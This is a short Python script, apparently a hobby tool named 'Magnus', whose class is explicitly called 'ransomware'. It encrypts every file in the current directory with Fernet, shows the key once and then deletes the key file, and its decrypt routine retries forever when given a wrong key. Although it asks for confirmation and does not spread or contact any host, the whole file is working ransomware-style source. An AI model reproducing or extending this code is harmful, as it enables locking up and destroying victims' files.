import os
from cryptography.fernet import Fernet


class ransomware:
    def encrypt():
        files = []
        key = Fernet.generate_key()

        for file in os.listdir():
            if file == 'Magnus.py' or file == 'key.key':
                continue
            
            if os.path.isfile(file):
                files.append(file)
        
        while True:
            os.system('cls')
            print(f'{files}\n\nThese files will be encrypted')
            x = input('\nDo you want to continue? (y/n): ')
            if x == 'y':
                break
            elif x == 'n':
                main()
            else:
                continue

        with open('key.key', 'wb') as thekey:
            thekey.write(key)

        for file in files:
            with open(file, 'rb') as thefile:
                contents = thefile.read()

            contents_encrypted = Fernet(key).encrypt(contents)
            
            with open(file, 'wb') as thefile:
                thefile.write(contents_encrypted)
        
        with open('key.key', 'r') as thekey:
            os.system('cls')
            print(f'\nYour key is: {thekey.read()}')

        os.remove('key.key')
        input('\nAll files have been encrypted,\n\nPress any key to return to menu: ')

    def decrypt():
        files = []

        for file in os.listdir():
            if file == 'Magnus.py' or file == 'key.key':
                continue
            
            if os.path.isfile(file):
                files.append(file)

        while True:
            os.system('cls')
            print(f'{files}\n\nThese files will be decrypted')
            x = input('\nDo you want to continue? (y/n): ')
            if x == 'y':
                break
            elif x == 'n':
                main()
            else:
                continue
        
        while True:
            os.system('cls')
            key = input('Enter the decryption key: ')

            try:
                for file in files:
                    with open(file, 'rb') as thefile:
                        contents = thefile.read()

                    contents_decrypted = Fernet(key).decrypt(contents)
                    
                    with open(file, 'wb') as thefile:
                        thefile.write(contents_decrypted)
                
                input('\nAll files have been decrypted,\n\nPress any key to return to menu: ')
                break
            
            except:
                continue

def main():
    while True:
        os.system('cls')
        print("""                                                                  
_/      _/                                                
_/_/  _/_/   _/_/_/   _/_/_/ _/_/_/   _/    _/   _/_/_/   
_/  _/  _/ _/    _/ _/    _/ _/    _/ _/    _/ _/_/        
_/      _/ _/    _/ _/    _/ _/    _/ _/    _/     _/_/     
_/      _/   _/_/_/   _/_/_/ _/    _/   _/_/_/ _/_/_/        
                         _/                                  
                     _/_/                                      
\n\n1) Encrypt
2) Decrypt
3) Exit""")
        x = input("\n>>$ ")
        if x == '1':
            os.system('cls')
            ransomware.encrypt()

        elif x == '2':
            os.system('cls')
            ransomware.decrypt()

        elif x == '3':
            quit()

        else:
            print("Invalid option")
main()